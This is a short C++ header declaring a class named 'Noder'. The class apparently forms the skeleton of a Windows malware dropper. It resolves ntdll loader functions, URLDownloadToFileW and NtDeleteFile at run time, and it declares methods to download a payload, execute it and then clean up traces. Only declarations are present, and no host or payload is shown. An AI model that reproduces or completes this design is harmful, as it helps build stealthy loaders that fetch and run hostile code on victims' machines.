#pragma once
#include <string>
#include "definitions.h"

class Noder {
public:
	Noder();

	~Noder();

private:

	//
	// Imported functions
	//
	f_LdrLoadDll LdrLoadDll;
	f_LdrUnloadDll LdrUnloadDll;
	f_LdrGetProcedureAddressForCaller LdrGetProcedureAddressForCaller; // Unused
	f_RtlInitUnicodeString RtlInitUnicodeString;
	f_RtlInitAnsiString RtlInitAnsiString;
	f_URLDownloadToFileW URLDownloadToFileW;
	f_NtDeleteFile NtDeleteFile;

	//
	// Imported dlls
	// 
	HMODULE urlmon;
	HMODULE ntdll;

	//
	// Misc
	//
	std::wstring destination;

	void Init() noexcept;

	bool LoadLibraries() noexcept;

	bool LoadFunctions() noexcept;

	bool DownloadPayload() noexcept;

	void ExecutePayload() noexcept;

	void CleanUp() noexcept;
};